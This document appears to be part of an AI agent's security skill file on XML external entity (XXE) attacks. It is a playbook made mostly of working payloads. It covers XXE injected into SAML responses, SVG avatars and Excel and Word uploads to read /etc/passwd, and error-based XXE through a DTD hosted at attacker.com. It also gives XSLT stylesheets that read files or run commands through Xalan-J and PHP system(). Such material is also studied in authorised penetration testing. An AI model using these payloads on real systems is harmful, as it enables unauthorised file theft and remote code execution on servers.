# xxe-xml-external-entity — 全文续篇

> 主卡保留前 16 节；本文件从第 17 节起。原文件：`/root/.hermes/skills/security/xxe-xml-external-entity/SKILL.md`

## 16. XXE IN NON-OBVIOUS FORMATS

| Format | XML Location | Injection Point |
|--------|-------------|-----------------|
| **SOAP Envelope** | Entire body is XML | Add DOCTYPE before `<soap:Envelope>` |
| **SVG Image** | SVG is XML | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in SVG header |
| **OOXML (.docx)** | `word/document.xml`, `[Content_Types].xml` | Inject DOCTYPE + entity into any XML member |
| **OOXML (.xlsx)** | `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml` | Entity reference in cell values |
| **RSS/Atom feeds** | Feed body is XML | Inject into feed items if user content is included |
| **SAML assertions** | SAML XML tokens | DOCTYPE injection in `SAMLResponse` parameter (base64-decoded XML) |
| **XMPP** | Protocol messages are XML stanzas | Entity in message body or JID fields |
| **GPX files** | GPS track data in XML | Via file upload endpoints accepting GPX |
| **XHTML** | Strict XHTML is valid XML | DOCTYPE injection in XHTML documents |

### SAML XXE

```xml
<!-- Base64-decode the SAMLResponse, inject DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Re-encode to base64, submit as `SAMLResponse` parameter.

---

## 17. XXE VIA FILE UPLOAD

### SVG upload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

Upload as avatar/image → view uploaded SVG → file content rendered as text.

### XLSX (Excel) upload

```bash
# 1. Create minimal .xlsx, unzip it
unzip report.xlsx -d xlsx_tmp/

# 2. Inject into xl/sharedStrings.xml
# Add after XML declaration:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Replace a <t> element content with &xxe;

# 3. Repackage
cd xlsx_tmp && zip -r ../malicious.xlsx .
```

Alternatively inject into `[Content_Types].xml` (parsed first by most OOXML processors).

### DOCX upload

```bash
# Target: word/document.xml
# Same approach: unzip → inject DOCTYPE + entity → repackage

# Alternative: inject into customXml/item1.xml if custom XML parts exist
```

### Processing pipeline attack

Even if the uploaded file is not directly rendered, the server-side parser (Apache POI, python-docx, OpenXML SDK) may process entities during import, triggering OOB exfiltration.

---

## 18. ERROR-BASED XXE

Force the XML parser to generate an error message containing file content:

### Method 1: Non-existent file reference

```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser attempts to open `file:///nonexistent/<hostname_content>` → error message includes the hostname value.

### Method 2: XML schema validation error

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>">
  %eval;
  %err;
]>
```

The `jar:` protocol handler generates verbose error messages that include the expanded entity value.

### Method 3: Integer overflow / type error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'file:///%file;'>">
%int;
%trick;
```

Parser tries to open a file path containing the target file content → error message reveals content.

---

## 19. XSLT INJECTION CONNECTION TO XXE

XSLT processors parse XML and can be chained with XXE:

### XSLT file read

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XSLT RCE (processor-dependent)

```xml
<!-- Xalan-J (Java) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP (libxslt with registerPHPFunctions) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XXE → XSLT chain

If the target accepts XML input with a stylesheet reference (`<?xml-stylesheet?>`), inject both an external entity and a malicious XSLT to escalate from file read to RCE.

